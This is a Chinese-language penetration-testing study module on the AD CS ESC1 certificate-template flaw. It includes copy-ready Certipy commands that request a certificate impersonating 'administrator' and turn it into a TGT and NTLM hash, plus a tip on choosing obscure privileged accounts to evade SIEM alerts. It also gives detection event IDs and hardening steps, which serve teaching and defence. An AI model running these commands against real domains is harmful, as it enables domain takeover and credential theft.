# R17.1 申請者自訂主體名稱 (SAN) 憑證簽發濫用分析 (Enrollee-Supplied Identity / ESC1)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**申請者自訂主體別名憑證簽發濫用 (AD CS ESC1)** 是 Active Directory 憑證服務中最經典的領域全盤接管漏洞。其本質為：**「企業 CA 範本錯誤配置了『允許申請者在請求中指定主體別名 (Subject Alternative Name, SAN)』；當該範本同時具備用戶端身分驗證 EKU 且開放給一般使用者註冊時，低權限網域使用者可向 CA 申請簽發包含 `administrator` 或其他特權帳號 UPN 的數位憑證，隨後利用 Kerberos PKINIT 擴展協議換取網域管理員 TGT 票據，達成瞬間全域提權」**。

```
[低權限用戶 (operator)] ── 1. 提交 CSR 申請憑證 (指定 SAN: administrator@corp.internal) ──► [企業 CA (AD CS)]
                                                                                                 │
                                                                                                 ▼ 範本配置 ENROLLEE_SUPPLIES_SUBJECT
                                                                                         [CA 盲目信任 SAN 簽發憑證]
                                                                                                 │
[攻擊者控制台] ◄── 2. 獲取簽發之 Administrator.pfx 憑證 ─────────────────────────────────────────┘
       │
       ├── 3. 發起 Kerberos PKINIT 預驗證 (AS-REQ，攜帶數位簽章) ──► [金鑰發放中心 (KDC / DC)]
       ▼                                                              │
[取得 Administrator TGT 票據！(PAC 包含 Domain Admins 權限)] ◄────────┘
```

### 核心作戰決策與邊界
- **ESC1 四大成立必備條件 (全部滿足才構成漏洞)**：
  1. 企業 CA 伺服器頒發註冊權限 (`Enrollment Permissions`) 開放給低權限帳號（如 `Domain Users`）。
  2. 憑證範本允許身分驗證 EKU（`Client Authentication`、`Smart Card Logon`、或 `Any Purpose`）。
  3. 範本旗標包含 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x00010000`)，即允許在 CSR 中指定 SAN。
  4. 範本**未要求**主管審批 (`CA Certificate Manager Approval`) 且不需要授權簽章。
- **技術邊界**：
  - **與 ESC6 差異**：ESC1 是單一範本層級配置允許 SAN；ESC6 則是 CA 實例層級開啟了全域旗標 `EDITF_ATTRIBUTESUBJECTALTNAME2`。

## 🔬 第一動：AD CS 憑證範本與 SAN 信任機制全景解剖 (Mechanics & ESC1 Conditions)

### 1. 關鍵屬性與旗標物理結構速查表

| 屬性名稱 (AD Schema Attribute) | 脆弱配置數值 (Vulnerable Value) | 語意與底層行為 |
| :--- | :--- | :--- |
| **`msPKI-Certificate-Name-Flag`** | 包含 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` | 允許申請者自定義 Subject Name 與 Subject Alternative Name (SAN) |
| **`pKIExtendedKeyUsage` (EKU)** | `1.3.6.1.5.5.7.3.2` (Client Auth)<br>`1.3.6.1.4.1.311.20.2.2` (Smartcard) | 允許此憑證用於 Windows 網域登入與 Kerberos PKINIT |
| **`msPKI-Enrollment-Flag`** | 未設置 `CT_FLAG_PEND_ALL_REQUESTS` | 憑證自動立即簽發，無須管理員手動核准 |
| **`nTSecurityDescriptor` (ACL)** | `Domain Users` 具備 `Enroll` 權限 | 任何普通網域員工皆可呼叫此範本 |

### 2. Kerberos PKINIT 驗證交換 (RFC 4556)
- 客戶端在 `AS-REQ` 中使用證書私鑰對預驗證數據進行數位簽章（PA-PK-AS-REQ）；
- KDC 驗證證書鏈合法性，並從證書的 SAN (UPN / OtherName) 提取目標帳號身分；
- KDC 發放該目標帳號的合法 Kerberos TGT，攻擊者直接取得對應身分之 Session Key。

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心利用指令速查表 (Certipy / PKINITtools)

#### 1. 自動化枚舉易受攻擊範本 (Certipy)
```bash
# 收集 AD CS 拓撲與漏洞標記
certipy find -u "operator@corp.internal" -p "P@ssword123" -dc-ip 10.0.0.1 -vulnerable
# 檢查輸出中是否有標記 [!] Vulnerabilities: ESC1 的範本
```

#### 2. 申請偽造管理員身分憑證
```bash
certipy req -u "operator@corp.internal" -p "P@ssword123" -ca "CORP-CA" \
    -template "VulnerableTemplate" -upn "administrator@corp.internal" -dc-ip 10.0.0.1
# 輸出: administrator.pfx
```

#### 3. 憑證身分驗證並換取 TGT 與 NTLM Hash
```bash
# 發起 PKINIT 獲取 TGT 並導出 NTLM Hash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
# 輸出: Administrator TGT 票據與 NTLM Hash: aad3...:e19ccf...
```

## 🥷 第三動：防禦規避與日誌鑑識特徵 (Evasion & Telemetry)

- **目標選擇防禦規避**：
  - 不直接指定 `administrator`，而是指定冷門但在敏感群組中的服務帳號或次要管理員，降低 SIEM 的觸發敏感度。
- **鑑識與遙測特徵**：
  - **CA 端審計事件 (Event ID 4887)**：CA 成功簽發憑證；檢視其 `Subject Alternative Name` 包含的帳號與發起請求的調用者 (`Requester`) 帳號**嚴重不一致**！
  - **KDC 驗證事件 (Event ID 4768)**：請求 TGT 成功；`Pre-Authentication Type` 標記為 **`16` (PKINIT)**，而非普遍的 `2` (Kerberos PA-ENC-TIMESTAMP)。

## 🛡️ 第五動：安全加固與修復基線 (Hardening & Remediation Baseline)

### 1. 範本配置修復：禁止申請者提供主體
在 Active Directory 憑證範本管理員中修改易受攻擊範本：
1. 切換至 **Subject Name (主體名稱)** 分頁；
2. 將選項從 `Supply in the request (在要求中提供)` 改選為 **`Build from this Active Directory information (從這個 Active Directory 資訊建構)`**；
3. 主體名稱格式勾選 **`User principal name (UPN)`**。

### 2. 開啟管理員審批與權限收斂
- 在 **Issuance Requirements (發行需求)** 分頁勾選 **`CA certificate manager approval (CA 憑證管理員核准)`**；
- 在 **Security (安全性)** 分頁移除 `Domain Users` 與 `Authenticated Users` 的 `Enroll` 權限。

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場情境設定
- **網域**：`corp.internal`
- **CA 實例**：`CORP-CA01`
- **易受攻擊範本**：`WebServer-ClientAuth` (具備 ESC1 配置，允許 Domain Users 註冊)

### 2. 三步驗證流程

1. **驗證 ESC1 弱點存在**：
   ```bash
   certipy find -u "user1@corp.internal" -p "Password123" -dc-ip 10.0.0.1 -vulnerable | grep -E "Template Name|ESC1"
   # 確認 WebServer-ClientAuth 標記 ESC1
   ```
2. **申請管理員憑證**：
   ```bash
   certipy req -u "user1@corp.internal" -p "Password123" -ca "CORP-CA01" \
       -template "WebServer-ClientAuth" -upn "Administrator@corp.internal" -dc-ip 10.0.0.1
   # 成功產生 Administrator.pfx
   ```
3. **換取 Administrator 雜湊值**：
   ```bash
   certipy auth -pfx Administrator.pfx -dc-ip 10.0.0.1
   # 成功取得 Administrator 的 NTLM Hash，全域提權完成！
   ```

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 構成 AD CS ESC1 漏洞的四大必備要素是什麼？**  
  *分析思路*：低權限用戶具備註冊權限、範本含有客戶端驗證 EKU、範本包含 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 旗標允許自訂 SAN、且不需要憑證管理員手動審批。

- [ ] **Q2. 攻擊者取得簽發的管理員 PFX 憑證後，如何轉換為實際的網域特權？**  
  *分析思路*：利用 Kerberos PKINIT 協議，使用該數位憑證與私鑰發起 AS-REQ 預驗證，KDC 驗證證書後即簽發對應管理員帳號的 TGT 票據，並可透過 UnPAC-hash 技術還原出管理員的 NTLM Hash。

- [ ] **Q3. 為什麼將範本改為「Build from this Active Directory information」能徹底消滅 ESC1？**  
  *分析思路*：因為 CA 會強制從發起申請之真實帳號的 Active Directory 物件屬性提取 UPN/Email，完全忽略申請者自定義的 SAN 參數，杜絕身分偽冒。

- [ ] **Q4. 藍隊在網域日誌中捕捉 ESC1 攻擊最關鍵的 Event ID 與特徵是什麼？**  
  *分析思路*：CA 伺服器的 Event ID 4887（檢視發起人與 SAN 的 UPN 是否相符）以及 DC 上的 Event ID 4768（預驗證類型為 16 / PKINIT 的異常帳號登入）。

- [ ] **Q5. 如果業務需要必須允許在 CSR 中提供主體（例如對外 Web 憑證），應如何安全防護？**  
  *分析思路*：徹底移除該範本中的身分驗證 EKU（僅保留 Server Authentication），嚴格禁止 Client Authentication 與 Smart Card Logon，使其無法用於 Windows 網域登入。
